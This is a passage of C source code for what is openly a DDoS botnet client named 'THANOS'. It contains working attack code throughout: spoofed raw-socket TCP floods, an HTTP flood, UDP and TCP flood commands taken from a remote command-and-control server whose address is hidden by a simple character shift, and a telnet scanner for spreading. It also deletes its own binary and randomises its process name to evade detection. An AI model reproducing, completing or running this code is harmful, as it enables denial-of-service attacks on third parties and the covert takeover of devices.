    if(getHost(target, &dest_addr.sin_addr)) 
    return; 
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); 
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) {    
    return;  
     }  
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) { 
    return;
    } 
    in_addr_t netmask;
    if ( spoofit == 0 ) 
    netmask = ( ~((in_addr_t) -1) ); 
    else 
    netmask = ( ~((1 << (32 - spoofit)) - 1) ); 
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize]; 
    struct iphdr *iph = (struct iphdr *)packet; 
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr); 
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize); 
    tcph->source = rand_cmwc(); 
    tcph->seq = rand_cmwc(); 
    tcph->ack_seq = 0; 
    tcph->doff = 5;
    if(!strcmp(flags, "all")){ tcph->syn = 1; tcph->rst = 1;  tcph->fin = 1; tcph->ack = 1; tcph->psh = 1;} else { unsigned char *pch = strtok(flags, ","); while(pch){ if(!strcmp(pch, "syn")){ tcph->syn = 1; } else if(!strcmp(pch,  "rst")){ tcph->rst = 1; } else if(!strcmp(pch,  "fin")) { tcph->fin = 1;} else if(!strcmp(pch,  "ack")){ tcph->ack = 1;} else if(!strcmp(pch,  "psh")){tcph->psh = 1;} else {} pch = strtok(NULL, ",");}}  tcph->window = rand_cmwc(); tcph->check = 0; tcph->urg_ptr = 0; tcph->dest = (port == 0 ? rand_cmwc() : htons(port)); tcph->check = tcpcsum(iph, tcph); iph->check = csum ((unsigned short *) packet, iph->tot_len); int end = time(NULL) + timeEnd; register unsigned int i = 0;
    while(1){ sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); iph->saddr = htonl( getRandomIP(netmask) ); iph->id = rand_cmwc(); tcph->seq = rand_cmwc(); tcph->source = rand_cmwc(); tcph->check = 0; tcph->check = tcpcsum(iph, tcph); iph->check = csum ((unsigned short *) packet, iph->tot_len); if(i == pollRegister) { if(time(NULL) > end) break;  i = 0; continue; } i++; }
}
int socket_connect(char *host, in_port_t port) 
{
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, 0);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}
int socket_connect2(char *host, char *port) 
{
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) 
    {
        exit(0);
    }
 
    for(p = servinfo; p != NULL; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) 
        {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) 
        {
            close(sock);
            continue;
        }
        break;
    }
    
    if(p == NULL) 
    {
        if(servinfo)
            freeaddrinfo(servinfo);
        //fprintf(stderr, "No connection could be made to %s:%s\n", host, port);
        exit(0);
    }
 
    if(servinfo)
        freeaddrinfo(servinfo);
    //fprintf(stderr, "[Connected -> %s:%s]\n", host, port);u
    return sock;
} 
//http flood written by shadoh
void httphex(char *method, char *host, in_port_t port, int timeEnd, int power)
{
    int socket, socket2, i, end = time(NULL) + timeEnd, sendIP = 0;
    char choosepath[1024];
    char request[512], buffer[1];
    const char *methods[] = {"GET", "HEAD", "POST"};
    const char *UserAgents[] = 
    {
        "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
        "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
    };
    sprintf(choosepath, "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A");

    for (i = 0; i < power; i++)
    {
        if(!strcmp(method, "RANDOM"))
        {
            sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", methods[(rand() % 3)], choosepath, host, UserAgents[(rand() % 5)]);
        }
        else
        {
            sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, choosepath, host, UserAgents[(rand() % 5)]);
        }
        
        
        if (fork())
        {
            while (end > time(NULL))
            {
                socket = socket_connect(host, port);
                socket2 = socket_connect2(host, port);
                if (socket != 0)
                {
                    write(socket, request, strlen(request));
                    write(socket2, request, strlen(request));
                    read(socket, buffer, 1);
                    read(socket2, buffer, 1);
                    close(socket);
                    close(socket2);
                }
            }
            exit(0);
        }
    }
}

void commandcontrol(int argc, unsigned char *argv[])
{      
   
    if (!strcmp(argv[0], "HTTPHEX"))
    {
        if (argc < 5 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) return;
        if (listFork()) return;
        httphex(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
        exit(0);
    }
    
    if(!strcmp(argv[0], "UDPFLOOD"))
    {
        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
        {
            
            return;
        }

        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int packetsize = atoi(argv[5]);
        int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);

        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    audp(hi, port, time, spoofed, packetsize, pollinterval);
                    close(uhmysockethere);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }

            audp(ip, port, time, spoofed, packetsize, pollinterval);
            close(uhmysockethere);

            _exit(0);
        }
    }

    if(!strcmp(argv[0], "TCPFLOOD"))
    {
        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }

        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];

        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int psize = argc > 6 ? atoi(argv[6]) : 0;

        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
                if(!listFork())
                {
                    atcp(hi, port, time, spoofed, flags, psize, pollinterval);
                    close(uhmysockethere);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }

            atcp(ip, port, time, spoofed, flags, psize, pollinterval);
            close(uhmysockethere);

            _exit(0);
        }
    }

    if(!strcmp(argv[0], "KT"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
        }
                if(!strcmp(argv[0], "THANOS"))
        {
                if(argc != 2)
                {
                        thanosprint(uhmysockethere, "THANOS ON | OFF");
                        return;
                }

                if(!strcmp(argv[1], "ON"))
                {
                        if(scanPid == 0) return;

                        kill(scanPid, 9);
                        thanosprint(uhmysockethere, "[THANOS] KILLED SCANNER\n");
                        scanPid = 0;
                }

                if(!strcmp(argv[1], "OFF"))
                {
                        if(scanPid != 0) return;
                        uint32_t parent;
                        parent = fork();
                       if (parent > 0) { scanPid = parent; return;}
                        else if(parent == -1) return;   
                        telnet_scanner();
                         
                        _exit(0);
                }
        }
            if(!strcmp(argv[0], "STOBLLIK"))
    {
        
        _exit(0);
}
    }

int initConnection()
{
        unsigned char server[4096];
        memset(server, 0, 4096);
        if(uhmysockethere) { close(uhmysockethere); uhmysockethere = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;
        strcpy(server, commServer[currentServer]);
        if(uhmysockethere) { close(uhmysockethere); uhmysockethere = 0; } 
        int port = mainport;
        uhmysockethere = socket(AF_INET, SOCK_STREAM, 0);
        
        int r;
        char str[] = {"4:;145;14;81583"};
        for(r = 0; (r < 100 && str[r] != '\0'); r++)
        str[r] = str[r] - 3;

        uhmysockethere = socket(AF_INET, SOCK_STREAM, 0);
        if(!connectTimeout(uhmysockethere, str, port, 30)) return 1;

        return 0;

}

int main(int argc, unsigned char *argv[])
{
        
        char name_buf[32];
        char id_buf[32];
        int name_buf_len;
        unlink(argv[0]);
        rand_init();
        name_buf_len = ((rand_next() % 4) + 3) * 4;
        rand_alphastr(name_buf, name_buf_len);
        name_buf[name_buf_len] = 0;
        strcpy(argv[0], name_buf);
        name_buf_len = ((rand_next() % 6) + 3) * 4;
        rand_alphastr(name_buf, name_buf_len);
        name_buf[name_buf_len] = 0;
        prctl(PR_SET_NAME, name_buf);
        printf("THANOS\r\n");
        getOurIP();
        srand(time(NULL) ^ getpid());
        rand_init();
        pid_t pid1;
        pid_t pid2;
        int status;
        if (pid1 = fork()) {
        waitpid(pid1, &status, 0);
        exit(0);
        } else if (!pid1) {
        if (pid2 = fork()) {
        exit(0);
        } else if (!pid2) {} else { }
        } else {} 
        chdir("/");
       
        signal(SIGPIPE, SIG_IGN);
        while(1)
        {           

                if(initConnection()) { sleep(3); continue; }
                char commBuf[4096];
                int got = 0;
                int i = 0;
                
                while((got = recvLine(uhmysockethere, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        unsigned char *message = commBuf;

                        if(*message == '.')
                        {
                                unsigned char *nickMask = message;
                              
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message;
                                message = message + strlen(nickMask) + 1;
                                while(message[strlen(message)] == '\n' || message[strlen(message)] == '\r') message[strlen(message) ] = 0x00;
                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;
                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }
                                commandcontrol(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
               
        }

        return 0;
}
